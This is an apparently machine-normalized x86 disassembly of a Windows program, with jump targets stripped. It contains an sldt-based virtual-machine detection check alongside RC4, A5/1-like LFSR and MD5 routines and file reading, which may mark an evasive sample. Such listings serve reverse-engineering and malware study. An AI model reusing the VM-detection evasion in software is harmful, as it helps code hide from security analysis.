sub_401000
push ecx
sldt [ esp ]
mov ax [ esp ]
test al al
je r-xdata
xor eax eax
pop ecx
retn
test ah ah
je r-xdata
mov eax 0x1
pop ecx
retn
sub_401060
push ecx
push ebx
push ebp
push esi
mov ebp ecx
push edi
xor edx edx
xor eax eax
lea edi [ ebp - 0x101 ]
mov [ edi + eax ] al
add eax 0x1
cmp eax 0x100
jl r-xdata
mov [ ebp - 0x103 ] dl
mov [ ebp - 0x205 ] dl
xor esi esi
mov [ esp + 0x10 ] 0x100
movzx esi al
lea edx [ esi + ebp - 0x101 ]
push edx
push edi
lea ecx [ ebp - 0x20a ]
call sub_401040
lea eax [ ebx + 0x1 ]
cdq
idiv [ esp + 0x1c ]
add edi 0x1
sub [ esp + 0x10 ] 0x1
jne r-xdata
dec eax
or eax 0xffffff00
inc eax
mov eax [ esp + 0x18 ]
movzx ebx dl
movzx ecx [ ebx + eax ]
movzx eax [ edi ]
add ecx esi
add eax ecx
and eax 0x800000ff
jns r-xdata
push 0x100
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x203 ]
push eax
call sub_4022a0
mov cl [ ebp - 0x205 ]
mov dl [ ebp - 0x103 ]
add esp 0xc
pop edi
pop esi
mov [ ebp - 0x204 ] cl
mov [ ebp - 0x102 ] dl
pop ebp
pop ebx
pop ecx
retn 0x8
sub_401120
push esi
mov esi ecx
push 0x100
lea eax [ esi - 0x203 ]
push eax
lea ecx [ esi - 0x101 ]
push ecx
call sub_4022a0
mov dl [ esi - 0x204 ]
mov al [ esi - 0x102 ]
add esp 0xc
mov [ esi - 0x205 ] dl
mov [ esi - 0x103 ] al
pop esi
retn
sub_401160
push esi
mov esi ecx
movzx eax [ esi - 0x205 ]
add eax 0x1
and eax 0x800000ff
jns r-xdata
movzx edx [ esi - 0x103 ]
movzx ecx al
mov [ esi - 0x205 ] al
movzx ecx [ ecx + esi - 0x101 ]
add ecx edx
and ecx 0x800000ff
jns r-xdata
dec eax
or eax 0xffffff00
inc eax
mov [ esi - 0x103 ] cl
movzx ecx cl
lea edx [ ecx + esi - 0x101 ]
movzx eax al
lea ecx [ eax + esi - 0x101 ]
push edx
push ecx
lea ecx [ esi - 0x20a ]
call sub_401040
movzx edx [ esi - 0x103 ]
movzx ecx [ esi - 0x205 ]
movzx eax [ edx + esi - 0x101 ]
movzx edx [ ecx + esi - 0x101 ]
add eax edx
and eax 0x800000ff
jns r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
mov [ esi - 0x1 ] al
movzx eax al
mov al [ eax + esi - 0x101 ]
xor al [ esp + 0x8 ]
mov [ esi - 0x206 ] al
pop esi
retn 0x4
dec eax
or eax 0xffffff00
inc eax
sub_401220
mov ecx [ esp + 0x4 ]
mov eax ecx
shr eax 0x10
xor ecx eax
mov edx ecx
shr edx 0x8
xor ecx edx
mov eax ecx
shr eax 0x4
xor ecx eax
mov edx ecx
shr edx 0x2
xor ecx edx
mov eax ecx
shr eax 0x1
xor eax ecx
and eax 0x1
retn 0x4
sub_401280
xor eax eax
cmp [ esp + 0x4 ] eax
setne al
xor ecx ecx
cmp [ esp + 0x8 ] ecx
setne cl
xor edx edx
add eax ecx
cmp [ esp + 0xc ] edx
setne dl
xor ecx ecx
add eax edx
cmp eax 0x2
setge cl
mov eax ecx
retn 0xc
sub_4012b0
push ebx
push ebp
push esi
mov esi ecx
push edi
mov edi [ esi + 0x10 ]
mov eax edi
and eax 0x80
push eax
mov ecx edi
and ecx 0x8
push ecx
mov edx edi
and edx 0x400
push edx
mov ecx esi
call sub_401280
cmp [ esp + 0x14 ] 0x0
mov ebx [ esp + 0x18 ]
mov ebp eax
jne r-xdata
mov edx [ esi + 0x4 ]
mov ecx ebx
shl ecx 0xf
push ecx
push 0x72000
push 0x7ffff
push edx
mov ecx esi
call sub_401250
cmp [ esp + 0x14 ] 0x0
mov [ esi + 0x4 ] eax
jne r-xdata
mov eax edi
shr eax 0xa
and eax 0x1
cmp eax ebp
jne r-xdata
mov edx [ esi + 0x8 ]
mov ecx ebx
shl ecx 0x10
push ecx
push 0x300000
push 0x3fffff
push edx
mov ecx esi
call sub_401250
cmp [ esp + 0x14 ] 0x0
mov [ esi + 0x8 ] eax
jne r-xdata
mov eax edi
shr eax 0x3
and eax 0x1
cmp eax ebp
jne r-xdata
mov edx [ esi + 0xc ]
mov ecx ebx
shl ecx 0x12
push ecx
push 0x700080
push 0x7fffff
push edx
mov ecx esi
call sub_401250
mov [ esi + 0xc ] eax
mov eax edi
shr eax 0x7
and eax 0x1
cmp eax ebp
jne r-xdata
shl ebx 0xa
push ebx
push 0x10800
push 0x1ffff
push edi
mov ecx esi
call sub_401250
pop edi
mov [ esi + 0x10 ] eax
pop esi
pop ebp
pop ebx
retn 0x8
sub_401390
push ecx
push ebx
push ebp
push esi
push edi
mov edi ecx
mov eax [ edi + 0x24 ]
mov ebx [ edi + 0x8 ]
mov esi [ edi + 0xc ]
mov [ esp + 0x10 ] eax
mov eax [ edi + 0x4 ]
mov ecx eax
mov edx eax
and ecx 0x1000
push ecx
not edx
and edx 0x4000
push edx
and eax 0x8000
push eax
mov ecx edi
call sub_401280
mov ebp eax
mov eax ebx
and eax 0x200
push eax
mov ecx ebx
and ecx 0x2000
mov edx ebx
not edx
push ecx
and edx 0x10000
push edx
mov ecx edi
call sub_401280
xor ebp eax
mov eax esi
not eax
and eax 0x2000
push eax
mov ecx esi
and ecx 0x10000
push ecx
mov edx esi
and edx 0x40000
push edx
mov ecx edi
call sub_401280
shr esi 0x1
xor esi ebx
shr esi 0x3
xor esi [ edi + 0x4 ]
xor ebp eax
mov eax [ esp + 0x10 ]
shr esi 0x12
and esi 0x1
xor ebp esi
mov [ edi + 0x24 ] ebp
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
sub_401440
push ebx
push ebp
xor eax eax
push esi
mov esi ecx
push edi
mov edi [ esp + 0x14 ]
mov [ esi - 0x4 ] eax
mov [ esi - 0x18 ] eax
mov [ esi - 0x1c ] eax
mov [ esi - 0x20 ] eax
mov [ esi - 0x24 ] eax
xor ebx ebx
lea ebp [ esi - 0x28 ]
jmp r-xdata
push eax
push 0x1
mov ecx ebp
call sub_4012b0
mov eax ebx
shr eax 0x3
movzx eax [ eax + edi ]
movzx ecx bl
and ecx 0x7
shr eax cl
add ebx 0x1
and eax 0x1
xor [ esi - 0x24 ] eax
xor [ esi - 0x20 ] eax
xor [ esi - 0x1c ] eax
xor [ esi - 0x18 ] eax
cmp ebx 0x40
jl r-xdata
xor eax eax
mov ebx [ esp + 0x18 ]
xor edi edi
lea esp [ esp ]
xor ecx ecx
cmp edi 0x15
sete cl
push ecx
push 0x1
mov ecx ebp
call sub_4012b0
mov ecx edi
mov eax ebx
sar eax cl
add edi 0x1
and eax 0x1
xor [ esi - 0x24 ] eax
xor [ esi - 0x20 ] eax
xor [ esi - 0x1c ] eax
xor [ esi - 0x18 ] eax
cmp edi 0x16
jl r-xdata
mov edi 0x64
push 0x0
push 0x0
mov ecx ebp
call sub_4012b0
sub edi 0x1
jne r-xdata
mov ecx ebp
call sub_401390
mov edx [ esi - 0x24 ]
mov eax [ esi - 0x20 ]
mov ecx [ esi - 0x1c ]
mov [ esi - 0x14 ] edx
mov edx [ esi - 0x18 ]
pop edi
mov [ esi - 0x10 ] eax
mov [ esi - 0xc ] ecx
mov [ esi - 0x8 ] edx
pop esi
pop ebp
pop ebx
retn 0x8
sub_401530
push ebx
push esi
push edi
xor bl bl
xor esi esi
lea edi [ ecx - 0x28 ]
lea ebx [ ebx ]
push 0x0
push 0x0
mov ecx edi
call sub_4012b0
mov ecx edi
call sub_401390
mov edx esi
and edx 0x7
mov ecx 0x7
sub ecx edx
shl al cl
add esi 0x1
or bl al
cmp esi 0x8
jl r-xdata
pop edi
mov al bl
xor al [ esp + 0xc ]
pop esi
pop ebx
retn 0x4
sub_401580
sub esp 0x108
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x104 ] eax
push esi
mov esi [ esp + 0x110 ]
cmp [ esi ] 0xdd
jne r-xdata
push edi
push 0x6
push esi
lea ecx [ esp + 0x10 ]
call sub_402350
lea edi [ esi + 0x6 ]
push edi
lea ecx [ esp + 0xc ]
call sub_4023e0
mov ecx [ esp + 0x10c ]
mov eax edi
pop edi
mov [ esi ] 0xdd
mov [ esi + 0x1 ] 0xb1
mov [ esi + 0x2 ] 0x97
mov [ esi + 0x3 ] 0xb5
mov [ esi + 0x4 ] 0xf2
mov [ esi + 0x5 ] 0x9b
pop esi
xor ecx esp
call sub_40acd2
add esp 0x108
retn
cmp [ esi + 0x1 ] 0xb1
jne r-xdata
cmp [ esi + 0x2 ] 0x97
jne r-xdata
cmp [ esi + 0x3 ] 0xb5
jne r-xdata
cmp [ esi + 0x4 ] 0xf2
jne r-xdata
cmp [ esi + 0x5 ] 0x9b
jne r-xdata
lea eax [ esi + 0x6 ]
pop esi
mov ecx [ esp + 0x104 ]
xor ecx esp
call sub_40acd2
add esp 0x108
retn
sub_401630
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
mov esi ecx
xor ebx ebx
lea esp [ esp ]
call sub_402c00
mov [ edi + ebx * 4 ] eax
add ebx 0x1
cmp ebx 0x2
jb r-xdata
push 0x8
lea eax [ edi + 0x8 ]
push edi
push eax
call sub_4022a0
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
mov eax [ edx + esi ]
add esp 0xc
lea ecx [ edx + esi ]
mov edx [ eax ]
push 0x8
push edi
call edx
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
mov ebx [ edx + esi + 0x4 ]
lea eax [ edx + esi ]
mov edx [ ecx + esi ]
add ecx esi
add eax 0x8
push ebx
push eax
mov eax [ edx ]
call eax
mov ebp [ esp + 0x18 ]
mov ebx 0x8
cmp ebp ebx
jle r-xdata
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
retn 0x8
jmp r-xdata
mov ecx [ esi ]
mov edx [ ecx + 0x8 ]
mov eax [ edx + esi ]
mov eax [ eax + 0x8 ]
lea ecx [ edx + esi ]
movzx edx [ ebx + edi ]
push edx
call eax
mov [ ebx + edi ] al
add ebx 0x1
cmp ebx ebp
jl r-xdata
sub_4016d0
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov edx [ ecx + esi ]
mov eax [ edx ]
push edi
mov edi [ esp + 0x14 ]
add ecx esi
push edi
push ebx
call eax
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
push edi
push ebx
add ecx esi
call sub_401840
pop edi
pop esi
pop ebx
retn 0x8
sub_401710
push ecx
push ebx
push esi
mov esi ecx
lea ebx [ esi + 0x5 ]
push 0x8
push ebx
call sub_4022d0
mov eax [ esp + 0x1c ]
add esp 0x8
cmp eax 0x10
jae r-xdata
push ebp
xor ebp ebp
cmp eax ebp
mov [ esi + 0x4 ] 0x0
mov [ esi + 0xd ] ebp
jle r-xdata
pop esi
xor eax eax
pop ebx
pop ecx
retn 0x8
mov eax [ esi + 0xd ]
pop ebp
pop esi
pop ebx
pop ecx
retn 0x8
mov eax [ esp + 0x14 ]
mov [ esp + 0xc ] eax
push edi
nop
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov edi [ esp + 0x10 ]
mov edx [ eax + esi ]
mov edx [ edx + 0x8 ]
lea ecx [ eax + esi ]
movzx eax [ edi ]
push eax
call edx
mov [ edi ] al
mov ecx [ esp + 0x18 ]
push 0x8
lea edx [ ecx + ebp + 0x8 ]
push edx
push ebx
call sub_4022a0
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov edx [ ecx + esi ]
mov eax [ esp + 0x1c ]
mov edx [ edx ]
add esp 0xc
add ecx esi
push 0x8
push eax
call edx
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
mov edi [ edx + esi + 0x4 ]
lea eax [ edx + esi ]
mov edx [ ecx + esi ]
add ecx esi
add eax 0x8
push edi
push eax
mov eax [ edx ]
call eax
xor edi edi
cmp [ esi + 0x4 ] 0x0
jne r-xdata
pop edi
mov edi [ esp + 0x10 ]
push 0x8
push ebx
push edi
call sub_4022f0
add esp 0xc
test al al
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov edx [ eax + esi ]
mov edx [ edx + 0x8 ]
lea ecx [ eax + esi ]
movzx eax [ ebx + edi ]
push eax
call edx
mov [ ebx + edi ] al
add edi 0x1
cmp edi 0x8
jb r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov eax [ esp + 0x18 ]
sub ebp 0x1
lea ecx [ eax + ebp + 0x1 ]
sub edi 0x1
add ebp 0x10
add edi 0x10
mov [ esi + 0x4 ] 0x1
mov [ esi + 0xd ] ecx
mov [ esp + 0x10 ] edi
jmp r-xdata
lea ecx [ edi + ebp ]
cmp ecx [ esp + 0x1c ]
jge r-xdata
add [ esp + 0x10 ] 0x1
add ebp 0x1
cmp ebp [ esp + 0x1c ]
jl r-xdata
sub_401860
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
xor esi esi
test ebp ebp
mov ebx 0x1
jle r-xdata
pop esi
pop ebp
pop ebx
retn 0x8
push edi
mov eax [ ecx - 0x4 ]
mov edi [ eax + 0x4 ]
mov eax ebx
cdq
idiv [ edi + ecx ]
mov eax [ esp + 0x14 ]
mov al [ esi + eax ]
add esi 0x1
add ebx ebx
add edx edi
cmp esi ebp
mov [ edx + ecx + 0x5 ] al
jl r-xdata
pop edi
sub_4018d0
sub esp 0x44
mov ecx [ esp + 0x4c ]
push ebx
push ebp
push esi
mov esi [ esp + 0x54 ]
mov eax [ esi ]
mov ebx [ esi + 0x8 ]
mov ebp [ esi + 0xc ]
push edi
mov edi [ esi + 0x4 ]
push 0x40
push ecx
lea edx [ esp + 0x1c ]
push edx
mov [ esp + 0x64 ] eax
call sub_4022a0
mov edx [ esp + 0x64 ]
mov ecx ebx
and ecx edi
mov eax edi
not eax
and eax ebp
or eax ecx
add eax [ esp + 0x20 ]
lea eax [ eax + edx - 0x28955b88 ]
rol eax 0x7
add eax edi
mov edx edi
and edx eax
mov ecx eax
not ecx
and ecx ebx
or ecx edx
add ecx [ esp + 0x24 ]
lea ecx [ ecx + ebp - 0x173848aa ]
rol ecx 0xc
add ecx eax
mov edx ecx
not edx
and edx edi
mov ebp ecx
and ebp eax
or edx ebp
add edx [ esp + 0x28 ]
mov ebp ecx
lea edx [ edx + ebx + 0x242070db ]
ror edx 0xf
add edx ecx
and ebp edx
mov ebx edx
not ebx
and ebx eax
or ebx ebp
add ebx [ esp + 0x2c ]
lea edi [ ebx + edi - 0x3e423112 ]
ror edi 0xa
add edi edx
mov [ esp + 0x64 ] edi
not edi
and edi ecx
mov ebx edx
and ebx [ esp + 0x64 ]
or edi ebx
add edi [ esp + 0x30 ]
lea eax [ edi + eax - 0xa83f051 ]
mov edi [ esp + 0x64 ]
rol eax 0x7
add eax edi
mov ebx eax
not ebx
and ebx edx
mov ebp edi
and ebp eax
or ebx ebp
add ebx [ esp + 0x34 ]
lea ecx [ ebx + ecx + 0x4787c62a ]
rol ecx 0xc
add ecx eax
mov ebx ecx
not ebx
and ebx edi
mov ebp ecx
and ebp eax
or ebx ebp
add ebx [ esp + 0x38 ]
mov ebp ecx
lea edx [ ebx + edx - 0x57cfb9ed ]
ror edx 0xf
add edx ecx
and ebp edx
mov ebx edx
not ebx
and ebx eax
or ebx ebp
add ebx [ esp + 0x3c ]
lea edi [ ebx + edi - 0x2b96aff ]
ror edi 0xa
add edi edx
mov [ esp + 0x64 ] edi
not edi
and edi ecx
mov ebx edx
and ebx [ esp + 0x64 ]
or edi ebx
add edi [ esp + 0x40 ]
lea eax [ edi + eax + 0x698098d8 ]
mov edi [ esp + 0x64 ]
rol eax 0x7
add eax edi
mov ebp edi
and ebp eax
mov ebx eax
not ebx
and ebx edx
or ebx ebp
add ebx [ esp + 0x44 ]
lea ecx [ ebx + ecx - 0x74bb0851 ]
rol ecx 0xc
add ecx eax
mov ebx ecx
not ebx
and ebx edi
mov ebp ecx
and ebp eax
or ebx ebp
add ebx [ esp + 0x48 ]
mov ebp ecx
lea edx [ ebx + edx - 0xa44f ]
ror edx 0xf
add edx ecx
and ebp edx
mov ebx edx
not ebx
and ebx eax
or ebx ebp
add ebx [ esp + 0x4c ]
lea edi [ ebx + edi - 0x76a32842 ]
ror edi 0xa
add edi edx
mov [ esp + 0x64 ] edi
not edi
and edi ecx
mov ebx edx
and ebx [ esp + 0x64 ]
or edi ebx
add edi [ esp + 0x50 ]
lea eax [ edi + eax + 0x6b901122 ]
mov edi [ esp + 0x64 ]
rol eax 0x7
add eax edi
mov ebx eax
not ebx
and ebx edx
mov ebp edi
and ebp eax
or ebx ebp
add ebx [ esp + 0x54 ]
lea ecx [ ebx + ecx - 0x2678e6d ]
rol ecx 0xc
add ecx eax
mov ebx ecx
not ebx
mov ebp ebx
and ebp edi
mov edi ecx
and edi eax
or ebp edi
add ebp [ esp + 0x58 ]
lea edx [ edx + ebp - 0x5986bc72 ]
ror edx 0xf
add edx ecx
and ebx edx
mov edi edx
not edi
mov [ esp + 0x1c ] edi
and edi eax
mov ebp ecx
and ebp edx
or edi ebp
add edi [ esp + 0x5c ]
mov ebp [ esp + 0x64 ]
lea edi [ edi + ebp + 0x49b40821 ]
ror edi 0xa
add edi edx
mov ebp ecx
and ebp edi
or ebx ebp
add ebx [ esp + 0x24 ]
mov ebp edx
lea eax [ ebx + eax - 0x9e1da9e ]
mov ebx [ esp + 0x1c ]
and ebx edi
rol eax 0x5
add eax edi
and ebp eax
or ebx ebp
add ebx [ esp + 0x38 ]
lea ecx [ ebx + ecx - 0x3fbf4cc0 ]
rol ecx 0x9
add ecx eax
mov ebx edi
not ebx
and ebx eax
mov ebp ecx
and ebp edi
or ebx ebp
add ebx [ esp + 0x4c ]
lea edx [ ebx + edx + 0x265e5a51 ]
mov ebx eax
not ebx
and ebx ecx
rol edx 0xe
add edx ecx
mov ebp edx
and ebp eax
or ebx ebp
add ebx [ esp + 0x20 ]
mov ebp ecx
lea edi [ ebx + edi - 0x16493856 ]
ror edi 0xc
add edi edx
mov ebx ecx
not ebx
and ebx edx
and ebp edi
or ebx ebp
add ebx [ esp + 0x34 ]
lea eax [ ebx + eax - 0x29d0efa3 ]
rol eax 0x5
add eax edi
mov [ esp + 0x64 ] eax
mov eax edx
not eax
and eax edi
mov ebx edx
and ebx [ esp + 0x64 ]
or eax ebx
add eax [ esp + 0x48 ]
mov ebx edi
lea ecx [ eax + ecx + 0x2441453 ]
mov eax [ esp + 0x64 ]
rol ecx 0x9
add ecx eax
not ebx
and ebx eax
not eax
and eax ecx
mov ebp ecx
and ebp edi
or ebx ebp
add ebx [ esp + 0x5c ]
lea edx [ ebx + edx - 0x275e197f ]
rol edx 0xe
add edx ecx
mov ebx edx
and ebx [ esp + 0x64 ]
or eax ebx
add eax [ esp + 0x30 ]
mov ebx ecx
lea edi [ eax + edi - 0x182c0438 ]
ror edi 0xc
add edi edx
and ebx edi
mov eax ecx
not eax
and eax edx
or eax ebx
add eax [ esp + 0x44 ]
mov ebx [ esp + 0x64 ]
lea eax [ eax + ebx + 0x21e1cde6 ]
rol eax 0x5
add eax edi
mov [ esp + 0x64 ] eax
mov eax edx
not eax
and eax edi
mov ebx edx
and ebx [ esp + 0x64 ]
or eax ebx
add eax [ esp + 0x58 ]
mov ebx edi
lea ecx [ eax + ecx - 0x3cc8f82a ]
mov eax [ esp + 0x64 ]
rol ecx 0x9
add ecx eax
not ebx
and ebx eax
mov ebp ecx
and ebp edi
or ebx ebp
add ebx [ esp + 0x2c ]
not eax
lea edx [ ebx + edx - 0xb2af279 ]
and eax ecx
rol edx 0xe
add edx ecx
mov ebx edx
and ebx [ esp + 0x64 ]
or eax ebx
add eax [ esp + 0x40 ]
mov ebx ecx
lea edi [ eax + edi + 0x455a14ed ]
ror edi 0xc
add edi edx
mov eax ecx
not eax
and eax edx
and ebx edi
or eax ebx
add eax [ esp + 0x54 ]
mov ebx [ esp + 0x64 ]
lea eax [ eax + ebx - 0x561c16fb ]
rol eax 0x5
add eax edi
mov [ esp + 0x64 ] eax
mov eax edx
not eax
mov ebx edx
and ebx [ esp + 0x64 ]
and eax edi
or eax ebx
add eax [ esp + 0x28 ]
lea ecx [ eax + ecx - 0x3105c08 ]
rol ecx 0x9
mov eax [ esp + 0x64 ]
add ecx eax
mov ebp ecx
and ebp edi
mov ebx edi
not ebx
and ebx eax
or ebx ebp
add ebx [ esp + 0x3c ]
not eax
lea edx [ ebx + edx + 0x676f02d9 ]
and eax ecx
rol edx 0xe
add edx ecx
mov ebx edx
and ebx [ esp + 0x64 ]
or eax ebx
add eax [ esp + 0x50 ]
mov ebx [ esp + 0x64 ]
lea edi [ eax + edi - 0x72d5b376 ]
mov eax ecx
xor eax edx
ror edi 0xc
add edi edx
xor eax edi
add eax [ esp + 0x34 ]
lea eax [ eax + ebx - 0x5c6be ]
rol eax 0x4
add eax edi
mov ebx edx
xor ebx edi
xor ebx eax
add ebx [ esp + 0x40 ]
lea ecx [ ebx + ecx - 0x788e097f ]
rol ecx 0xb
add ecx eax
mov ebx ecx
xor ebx edi
xor ebx eax
add ebx [ esp + 0x4c ]
lea edx [ ebx + edx + 0x6d9d6122 ]
rol edx 0x10
add edx ecx
mov ebx ecx
xor ebx edx
mov [ esp + 0x64 ] ebx
xor ebx eax
add ebx [ esp + 0x58 ]
lea edi [ ebx + edi - 0x21ac7f4 ]
mov ebx [ esp + 0x64 ]
ror edi 0x9
add edi edx
xor ebx edi
add ebx [ esp + 0x24 ]
lea eax [ ebx + eax - 0x5b4115bc ]
rol eax 0x4
add eax edi
mov ebx edx
xor ebx edi
xor ebx eax
add ebx [ esp + 0x30 ]
lea ebx [ ebx + ecx + 0x4bdecfa9 ]
rol ebx 0xb
add ebx eax
mov ecx ebx
xor ecx edi
xor ecx eax
add ecx [ esp + 0x3c ]
mov ebp ebx
lea edx [ ecx + edx - 0x944b4a0 ]
rol edx 0x10
add edx ebx
xor ebp edx
mov ecx ebp
xor ecx eax
add ecx [ esp + 0x48 ]
lea ecx [ ecx + edi - 0x41404390 ]
ror ecx 0x9
add ecx edx
xor ebp ecx
add ebp [ esp + 0x54 ]
mov edi edx
xor edi ecx
lea eax [ eax + ebp + 0x289b7ec6 ]
rol eax 0x4
add eax ecx
xor edi eax
add edi [ esp + 0x20 ]
lea edi [ edi + ebx - 0x155ed806 ]
rol edi 0xb
add edi eax
mov ebx edi
xor ebx ecx
xor ebx eax
add ebx [ esp + 0x2c ]
lea ebx [ ebx + edx - 0x2b10cf7b ]
rol ebx 0x10
add ebx edi
mov edx edi
xor edx ebx
mov ebp edx
xor ebp eax
add ebp [ esp + 0x38 ]
lea ecx [ ecx + ebp + 0x4881d05 ]
ror ecx 0x9
add ecx ebx
xor edx ecx
add edx [ esp + 0x44 ]
lea eax [ edx + eax - 0x262b2fc7 ]
mov edx ebx
xor edx ecx
rol eax 0x4
add eax ecx
xor edx eax
add edx [ esp + 0x50 ]
lea edx [ edx + edi - 0x1924661b ]
rol edx 0xb
add edx eax
mov edi edx
xor edi ecx
xor edi eax
add edi [ esp + 0x5c ]
lea edi [ edi + ebx + 0x1fa27cf8 ]
rol edi 0x10
add edi edx
mov ebx edx
xor ebx edi
xor ebx eax
add ebx [ esp + 0x28 ]
lea ecx [ ebx + ecx - 0x3b53a99b ]
ror ecx 0x9
add ecx edi
mov ebx edx
not ebx
or ebx ecx
xor ebx edi
add ebx [ esp + 0x20 ]
lea eax [ ebx + eax - 0xbd6ddbc ]
rol eax 0x6
add eax ecx
mov ebx edi
not ebx
or ebx eax
xor ebx ecx
add ebx [ esp + 0x3c ]
lea edx [ ebx + edx + 0x432aff97 ]
rol edx 0xa
add edx eax
mov ebx ecx
not ebx
or ebx edx
xor ebx eax
add ebx [ esp + 0x58 ]
lea edi [ ebx + edi - 0x546bdc59 ]
rol edi 0xf
mov ebx eax
not ebx
add edi edx
or ebx edi
xor ebx edx
add ebx [ esp + 0x34 ]
lea ecx [ ebx + ecx - 0x36c5fc7 ]
ror ecx 0xb
add ecx edi
mov ebx edx
not ebx
or ebx ecx
xor ebx edi
add ebx [ esp + 0x50 ]
lea eax [ ebx + eax + 0x655b59c3 ]
rol eax 0x6
add eax ecx
mov ebx edi
not ebx
or ebx eax
xor ebx ecx
add ebx [ esp + 0x2c ]
lea edx [ ebx + edx - 0x70f3336e ]
rol edx 0xa
add edx eax
mov ebx ecx
not ebx
or ebx edx
xor ebx eax
add ebx [ esp + 0x48 ]
lea edi [ ebx + edi - 0x100b83 ]
rol edi 0xf
add edi edx
mov ebx eax
not ebx
or ebx edi
xor ebx edx
add ebx [ esp + 0x24 ]
lea ecx [ ebx + ecx - 0x7a7ba22f ]
ror ecx 0xb
add ecx edi
mov ebx edx
not ebx
or ebx ecx
xor ebx edi
add ebx [ esp + 0x40 ]
lea eax [ ebx + eax + 0x6fa87e4f ]
rol eax 0x6
add eax ecx
mov ebx edi
not ebx
or ebx eax
xor ebx ecx
add ebx [ esp + 0x5c ]
lea edx [ ebx + edx - 0x1d31920 ]
rol edx 0xa
add edx eax
mov ebx ecx
not ebx
or ebx edx
xor ebx eax
add ebx [ esp + 0x38 ]
lea edi [ ebx + edi - 0x5cfebcec ]
rol edi 0xf
add edi edx
mov ebx eax
not ebx
or ebx edi
xor ebx edx
add ebx [ esp + 0x54 ]
lea ecx [ ebx + ecx + 0x4e0811a1 ]
ror ecx 0xb
add ecx edi
mov ebx edx
not ebx
or ebx ecx
xor ebx edi
add ebx [ esp + 0x30 ]
lea eax [ ebx + eax - 0x8ac817e ]
rol eax 0x6
mov ebx edi
not ebx
add eax ecx
or ebx eax
xor ebx ecx
add ebx [ esp + 0x4c ]
lea edx [ ebx + edx - 0x42c50dcb ]
rol edx 0xa
add [ esi ] eax
add edx eax
mov ebx ecx
add [ esi + 0xc ] edx
not ebx
or ebx edx
xor ebx eax
add ebx [ esp + 0x28 ]
not eax
lea edi [ ebx + edi + 0x2ad7d2bb ]
rol edi 0xf
add edi edx
add [ esi + 0x8 ] edi
or eax edi
xor eax edx
add eax [ esp + 0x44 ]
push 0x40
lea eax [ eax + ecx - 0x14792c6f ]
ror eax 0xb
lea ecx [ esp + 0x24 ]
add eax edi
add [ esi + 0x4 ] eax
push ecx
call sub_4022d0
add esp 0x14
pop edi
pop esi
pop ebp
pop ebx
add esp 0x44
retn
sub_401fd0
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
mov ecx [ esi + 0x10 ]
mov eax ecx
push edi
mov edi [ esp + 0x1c ]
shr eax 0x3
lea ecx [ ecx + edi * 8 ]
lea edx [ edi * 8 ]
and eax 0x3f
cmp ecx edx
mov [ esi + 0x10 ] ecx
jae r-xdata
mov ecx edi
shr ecx 0x1d
add [ esi + 0x14 ] ecx
mov ebx 0x40
sub ebx eax
cmp edi ebx
jb r-xdata
add [ esi + 0x14 ] 0x1
xor ebp ebp
mov edx [ esp + 0x18 ]
push ebx
push edx
lea eax [ eax + esi + 0x18 ]
push eax
call sub_4022a0
lea ecx [ esi + 0x18 ]
push ecx
push esi
call sub_4018d0
mov ebp ebx
add ebx 0x3f
add esp 0x14
cmp ebx edi
jae r-xdata
xor eax eax
jmp r-xdata
mov edx [ esp + 0x18 ]
lea eax [ edx + ebx - 0x3f ]
push eax
push esi
call sub_4018d0
add ebx 0x40
add esp 0x8
add ebp 0x40
cmp ebx edi
jb r-xdata
mov ecx [ esp + 0x18 ]
sub edi ebp
push edi
add ebp ecx
lea edx [ eax + esi + 0x18 ]
push ebp
push edx
call sub_4022a0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
retn
sub_402080
sub esp 0xc
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
push esi
push edi
mov edi [ esp + 0x18 ]
push 0x8
lea esi [ edi + 0x10 ]
lea eax [ esp + 0xc ]
push esi
push eax
call sub_4022a0
mov eax [ esi ]
shr eax 0x3
and eax 0x3f
add esp 0xc
cmp eax 0x38
mov ecx 0x38
jb r-xdata
sub ecx eax
push ecx
push rw-data
push edi
call sub_401fd0
push 0x8
lea ecx [ esp + 0x18 ]
push ecx
push edi
call sub_401fd0
mov ecx [ esp + 0x28 ]
add esp 0x18
pop edi
pop esi
xor ecx esp
call sub_40acd2
add esp 0xc
retn
mov ecx 0x78
sub_4020f0
push esi
mov esi [ esp + 0xc ]
push esi
call sub_402080
mov eax [ esp + 0xc ]
push 0x10
push esi
push eax
call sub_4022a0
push 0x58
push esi
call sub_4022d0
add esp 0x18
pop esi
retn
sub_402120
mov eax 0x1074
call sub_40ad70
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1070 ] eax
mov eax [ esp + 0x1078 ]
mov ecx [ esp + 0x107c ]
push esi
push edi
xor edi edi
push edi
push edi
push 0x3
push edi
push 0x1
push 0x80000000
push eax
mov [ esp + 0x28 ] ecx
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push ebx
push 0x0
push esi
call [ GetFileSize@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
pop edi
xor al al
pop esi
mov ecx [ esp + 0x1070 ]
xor ecx esp
call sub_40acd2
add esp 0x1074
retn
lea edx [ esp + 0x14 ]
push edx
call sub_4018a0
add esp 0x4
test ebx ebx
jbe r-xdata
push esi
call [ CloseHandle@IAT ]
pop ebx
pop edi
xor al al
pop esi
mov ecx [ esp + 0x1070 ]
xor ecx esp
call sub_40acd2
add esp 0x1074
retn
push esi
call [ CloseHandle@IAT ]
lea ecx [ esp + 0x14 ]
